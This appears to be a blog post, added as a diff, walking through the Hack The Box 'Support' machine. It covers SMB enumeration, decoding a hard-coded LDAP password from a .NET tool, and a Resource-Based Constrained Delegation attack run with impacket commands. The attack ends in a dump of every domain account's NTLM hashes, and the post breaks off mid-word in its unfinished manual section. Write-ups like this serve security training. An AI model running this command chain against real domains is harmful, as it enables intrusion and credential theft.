@@ -1,0 +1,343 @@
+---
+title: HTB - Support (Easy)
+date: '2025-07-13'
+tags: ['machine', 'windows', 'Active Directory']
+draft: false
+summary: Placeholder
+---
+
+<TOCInline toc={props.toc} asDisclosure />
+
+## Scanning
+
+```
+❯ nmap -sV -sC -v -Pn 10.129.230.181
+
+Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-07-13 07:04 +08
+NSE: Loaded 156 scripts for scanning.
+NSE: Script Pre-scanning.
+Initiating NSE at 07:04
+Completed NSE at 07:04, 0.00s elapsed
+Initiating NSE at 07:04
+Completed NSE at 07:04, 0.00s elapsed
+Initiating NSE at 07:04
+Completed NSE at 07:04, 0.00s elapsed
+Initiating Parallel DNS resolution of 1 host. at 07:04
+Completed Parallel DNS resolution of 1 host. at 07:04, 0.01s elapsed
+Initiating Connect Scan at 07:04
+Scanning 10.129.230.181 [1000 ports]
+Discovered open port 445/tcp on 10.129.230.181
+Discovered open port 139/tcp on 10.129.230.181
+Discovered open port 53/tcp on 10.129.230.181
+Discovered open port 135/tcp on 10.129.230.181
+Discovered open port 389/tcp on 10.129.230.181
+Discovered open port 88/tcp on 10.129.230.181
+Discovered open port 636/tcp on 10.129.230.181
+Discovered open port 464/tcp on 10.129.230.181
+Discovered open port 593/tcp on 10.129.230.181
+Discovered open port 3268/tcp on 10.129.230.181
+Discovered open port 3269/tcp on 10.129.230.181
+Completed Connect Scan at 07:04, 4.69s elapsed (1000 total ports)
+Initiating Service scan at 07:04
+Scanning 11 services on 10.129.230.181
+Completed Service scan at 07:05, 8.26s elapsed (11 services on 1 host)
+NSE: Script scanning 10.129.230.181.
+Initiating NSE at 07:05
+Completed NSE at 07:06, 98.64s elapsed
+Initiating NSE at 07:06
+Completed NSE at 07:07, 50.07s elapsed
+Initiating NSE at 07:07
+Completed NSE at 07:07, 0.00s elapsed
+Nmap scan report for 10.129.230.181
+Host is up (0.015s latency).
+Not shown: 989 filtered tcp ports (no-response)
+PORT     STATE SERVICE       VERSION
+53/tcp   open  domain        Simple DNS Plus
+88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-07-12 23:04:58Z)
+135/tcp  open  msrpc         Microsoft Windows RPC
+139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
+389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: support.htb0., Site: Default-First-Site-Name)
+445/tcp  open  microsoft-ds?
+464/tcp  open  kpasswd5?
+593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+636/tcp  open  tcpwrapped
+3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: support.htb0., Site: Default-First-Site-Name)
+3269/tcp open  tcpwrapped
+Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+|_clock-skew: -1s
+| smb2-time: 
+|   date: 2025-07-12T23:05:02
+|_  start_date: N/A
+
+NSE: Script Post-scanning.
+Initiating NSE at 07:07
+Completed NSE at 07:07, 0.00s elapsed
+Initiating NSE at 07:07
+Completed NSE at 07:07, 0.00s elapsed
+Initiating NSE at 07:07
+Completed NSE at 07:07, 0.00s elapsed
+Read data files from: /usr/bin/../share/nmap
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 162.00 seconds
+```
+
+---
+
+## Enumeration
+
+```
+❯ nxc smb support.htb -u 'a' -p '' --users
+```
+
+Guest logon is enabled, let's try enumerate shares
+
+![Description](/static/images/htb/windows/support/1.jpg)
+
+```
+❯ smbclient -L support.htb -U a%
+```
+
+![Description](/static/images/htb/windows/support/2.jpg)
+
+Interesting non-default share available, `support-tools`
+
+```
+❯ smbclient //support.htb/support-tools -U a%
+```
+
+![Description](/static/images/htb/windows/support/3.jpg)
+
+Apart from the other programs, we can notice an interesting zip file called `UserInfo.exe.zip`. Unzipping it will give us some DLLs that
+are probably required to run the program and the executable itself. We also find that the executable is a .NET application
+
+![Description](/static/images/htb/windows/support/4.jpg)
+
+We can utlize a .NET debugger like dnSpy to debug and disassemble the application
+
+![Description](/static/images/htb/windows/support/5.jpg)
+
+We can analyse a few functions after decompiling but the `LdapQuery` class seems to authenticate a user named `ldap` against the LDAP server,
+furthermore, we can notice that is retrieving a string called `password` from the `Protected` class using the `getPassword()` function 
+
+![Description](/static/images/htb/windows/support/6.jpg)
+
+Analyzing the said class reveals an encoded string with a key. It seems there is some sort of XOR encryption going on here
+
+![Description](/static/images/htb/windows/support/7.jpg)
+
+Encoeded Base64 string:
+
+```
+private static string enc_password = "0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E";
+```
+
+Key that is used for XOR:
+
+```
+private static byte[] key = Encoding.ASCII.GetBytes("armando");
+```
+
+Now the function `getPassword()` first decodes the Base64 string into a byte array, then does a for loop that each byte is 
+XORed with a byte from the key with a constant of `223`
+
+```
+public static string getPassword()
+		{
+			byte[] array = Convert.FromBase64String(Protected.enc_password);
+			byte[] array2 = array;
+			for (int i = 0; i < array.Length; i++)
+			{
+				array2[i] = array[i] ^ Protected.key[i % Protected.key.Length] ^ 223;
+			}
+			return Encoding.Default.GetString(array2);
+		}
+```
+
+We can try to write a script that replicates the decryption process
+
+```python
+import base64
+
+enc_password = "0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E"
+key = b"armando"
+
+data = base64.b64decode(enc_password)
+decrypted = bytearray()
+
+for i in range(len(data)):
+	decrypted_byte = data[i] ^ key[i % len(key)] ^ 223
+	decrypted.append(decrypted_byte)
+
+password = decrypted.decode('utf-8')
+
+print(f'Decrypted password: {password}')
+```
+
+```
+❯ python3 decrypt.py
+
+Decrypted password: nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz
+```
+Let us verify the credentials
+
+![Description](/static/images/htb/windows/support/8.jpg)
+
+Yep, we got it
+
+Enumerate users
+
+```
+❯ nxc smb support.htb -u 'ldap' -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' --users
+```
+
+![Description](/static/images/htb/windows/support/9.jpg)
+
+We can go ahead and put them in a list. Initially, I queried for Bloodhound data but LDAP was bugging out at the moment.
+Anyways, we can see the username, `ldap` is probably hinting at LDAP enumeration so that's what we're going to do.
+
+```
+❯ nxc ldap support.htb -u ldap -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' --query "(objectclass=*)" ""
+```
+
+This LDAP query returns every object from the LDAP server. It is a bit messy so I used `ldapdomaindump` instead for a more structured
+output
+
+```
+❯ ldapdomaindump -u support.htb\\ldap -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' ldap://10.129.230.181 -o ldap
+```
+
+![Description](/static/images/htb/windows/support/10.jpg)
+
+Going through the user objects carefully we will notice what looks like a password for the user `support`
+
+![Description](/static/images/htb/windows/support/11.jpg)
+
+Verify them 
+
+![Description](/static/images/htb/windows/support/12.jpg)
+
+Valid, lets goo. Lets us try querying for Bloodhound data
+
+```
+❯ nxc ldap support.htb -u 'support' -p 'Ironside47pleasure40Watchful' --dns-server 10.129.230.181 --bloodhound --collection All
+```
+
+![Description](/static/images/htb/windows/support/13.jpg)
+
+![Description](/static/images/htb/windows/support/14.jpg)
+
+Finally works bruh, we can see user `support` is a member of the Remote Management Users group. We can easily retrieve
+the user flag
+
+![Description](/static/images/htb/windows/support/15.jpg)
+
+User `support` is also a member of the `Shared Support Account` which has `GenericAll` over a computer account which is
+the Domain Controller itself
+
+![Description](/static/images/htb/windows/support/16.jpg)
+
+If we click on the ACE and check the left pane, Bloodhound provides a somewhat step by step exploitation technique and explanation
+of the vulnerability
+
+![Description](/static/images/htb/windows/support/17.jpg)
+
+In this case, the vulnerability is a Resource-Based Constrained Delegation. Now, what in the world is that? Imagine a database service
+that can be set up to allow specific services, like a web service, to act on behalf of users through assigned security permissions.
+
+Simply put, its a feature that enables administrators to delegate permissions in order to manage resources more securely. This is a great & very detailed [article](https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html) about it
+
+So I am going to do this in 2 methods, the easy method and the manual method to further explore the requirements of this attack
+
+# The Easy Method
+
+We can just follow what Bloodhound suggested with 3 commands. First, we need to add a rogue computer
+
+```
+❯ impacket-addcomputer -computer-name 'ATTACKERSYSTEM$' -computer-pass 'Password123!' -dc-host 10.129.238.56 'support.htb/support:Ironside47pleasure40Watchful'
+```
+
+![Description](/static/images/htb/windows/support/18.jpg)
+
+Next, we need to delegate from the rogue computer to the target computer
+
+```
+❯ impacket-rbcd -delegate-from ATTACKERSYSTEM$ -delegate-to DC$ -action write support.htb/support:Ironside47pleasure40Watchful -dc-ip 10.129.238.56
+```
+
+![Description](/static/images/htb/windows/support/19.jpg)
+
+Then, we request a Service Ticket for the service name we want to impersonate `Administrator`, In this case, its the CIFS service
+
+```
+❯ impacket-getST -spn cifs/dc.support.htb -impersonate Administrator support.htb/ATTACKERSYSTEM$:Password123!
+```
+
+![Description](/static/images/htb/windows/support/20.jpg)
+
+By now, we should have the ticket generated, all that's left is to export it to the `KRB5CCNAME` variable
+
+```
+❯ export KRB5CCNAME=Administrator@cifs_dc.support.htb@SUPPORT.HTB.ccache
+```
+
+We can `psexec` using the Kerberos ticket and we will land a SYSTEM session and can grab the root ticket
+
+```
+❯ impacket-psexec support.htb/administrator@dc.support.htb -k -no-pass
+```
+
+![Description](/static/images/htb/windows/support/21.jpg)
+
+Oh as a bonus we can also dump everyones NTLM hashes from NTDS.dit using secretsdump
+
+```
+❯ impacket-secretsdump -k DC.support.htb
+
+...
+...
+[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+[*] Using the DRSUAPI method to get NTDS.DIT secrets
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:bb06cbc02b39abeddd1335bc30b19e26:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+krbtgt:502:aad3b435b51404eeaad3b435b51404ee:6303be52e22950b5bcb764ff2b233302:::
+ldap:1104:aad3b435b51404eeaad3b435b51404ee:b735f8c7172b49ca2b956b8015eb2ebe:::
+support:1105:aad3b435b51404eeaad3b435b51404ee:11fbaef07d83e3f6cde9f0ff98a3af3d:::
+smith.rosario:1106:aad3b435b51404eeaad3b435b51404ee:0fab66daddc6ba42a3b0963123350706:::
+hernandez.stanley:1107:aad3b435b51404eeaad3b435b51404ee:0fab66daddc6ba42a3b0963123350706:::
+wilson.shelby:1108:aad3b435b51404eeaad3b435b51404ee:0fab66daddc6ba42a3b0963123350706:::
+anderson.damian:1109:aad3b435b51404eeaad3b435b51404ee:0fab66daddc6ba42a3b0963123350706:::
+thomas.raphael:1110:aad3b435b51404eeaad3b435b51404ee:0fab66daddc6ba42a3b0963123350706:::
+levine.leopoldo:1111:aad3b435b51404eeaad3b435b51404ee:0fab66daddc6ba42a3b0963123350706:::
+raven.clifton:1112:aad3b435b51404eeaad3b435b51404ee:0fab66daddc6ba42a3b0963123350706:::
+bardot.mary:1113:aad3b435b51404eeaad3b435b51404ee:0fab66daddc6ba42a3b0963123350706:::
+cromwell.gerard:1114:aad3b435b51404eeaad3b435b51404ee:0fab66daddc6ba42a3b0963123350706:::
+monroe.david:1115:aad3b435b51404eeaad3b435b51404ee:0fab66daddc6ba42a3b0963123350706:::
+west.laura:1116:aad3b435b51404eeaad3b435b51404ee:0fab66daddc6ba42a3b0963123350706:::
+langley.lucy:1117:aad3b435b51404eeaad3b435b51404ee:0fab66daddc6ba42a3b0963123350706:::
+daughtler.mabel:1118:aad3b435b51404eeaad3b435b51404ee:0fab66daddc6ba42a3b0963123350706:::
+stoll.rachelle:1119:aad3b435b51404eeaad3b435b51404ee:0fab66daddc6ba42a3b0963123350706:::
+ford.victoria:1120:aad3b435b51404eeaad3b435b51404ee:0fab66daddc6ba42a3b0963123350706:::
+DC$:1000:aad3b435b51404eeaad3b435b51404ee:e2e3a4338eadd9bf0f6f640e68c82340:::
+ATTACKERSYSTEM$:6101:aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe:::
+```
+
+
+
+# The Manual Method
+
+The attached below is an amazing explanation and step by step video on how to exploit this. I will use it as my reference
+
+<YouTubeEmbed videoId="RUbADHcBLKg" title="BloodHound 2.1's New Computer Takeover Attack" />
+
+Fir 
+
+
+
+
+
+
+
+
